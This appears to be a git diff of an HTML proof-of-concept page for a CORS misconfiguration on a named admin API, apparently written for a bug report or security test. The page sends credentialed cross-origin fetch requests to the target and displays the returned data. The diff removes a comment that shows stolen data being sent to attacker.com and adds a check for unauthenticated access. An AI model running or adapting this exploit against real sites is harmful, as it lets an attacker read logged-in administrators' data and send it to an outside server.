@@ -3,11 +3,12 @@
 <head><title>CORS PoC</title></head>
 <body>
 <h2>CORS PoC - ContainerKart Admin</h2>
-<p>Simulates what happens when a logged-in admin visits a malicious page</p>
 <button onclick="exploit()">Run PoC</button>
+<button onclick="testPreflight()">Test Preflight Only</button>
 <pre id="output">Output will appear here...</pre>
 
 <script>
+// Test 1: Full exploit
 function exploit() {
   document.getElementById("output").innerText = "Sending request...";
 
@@ -16,25 +17,34 @@ function exploit() {
     credentials: "include"
   })
   .then(r => {
-    // Capture response headers for proof
-    console.log("CORS Header:", r.headers.get("Access-Control-Allow-Origin"));
+    console.log("Status:", r.status);
+    console.log("ACAO Header:", r.headers.get("Access-Control-Allow-Origin"));
     return r.json();
   })
   .then(data => {
     document.getElementById("output").innerText = 
-      "✅ CORS CONFIRMED VULNERABLE\n\n" +
-      "Origin: https://stain404.github.io (untrusted)\n" +
-      "Credentials sent: YES\n" +
-      "Data received: YES\n\n" +
-      "Sample data:\n" + JSON.stringify(data, null, 2);
-
-    // In real attack - exfiltrate to attacker server:
-    // fetch("https://attacker.com/steal?d=" + btoa(JSON.stringify(data)));
+      "✅ VULNERABLE!\n\n" + JSON.stringify(data, null, 2);
   })
   .catch(err => {
+    document.getElementById("output").innerText = "❌ Error: " + err + 
+      "\n\nCheck DevTools Console & Network tab for details";
+    console.error("Full error:", err);
+  });
+}
+
+// Test 2: Without credentials (confirms if endpoint is public)
+function testPreflight() {
+  fetch("https://containerkart-admin.clicklogic.tech/api/v1/ckproducts/products/filter?page=1&per_page=15", {
+    method: "GET",
+    credentials: "omit"   // no cookies
+  })
+  .then(r => r.json())
+  .then(data => {
     document.getElementById("output").innerText = 
-      "Error (may still be vulnerable - check browser console):\n" + err;
-    console.error(err);
+      "✅ Endpoint is PUBLIC (no auth needed)!\n\n" + JSON.stringify(data, null, 2);
+  })
+  .catch(err => {
+    document.getElementById("output").innerText = "Error: " + err;
   });
 }
 </script>
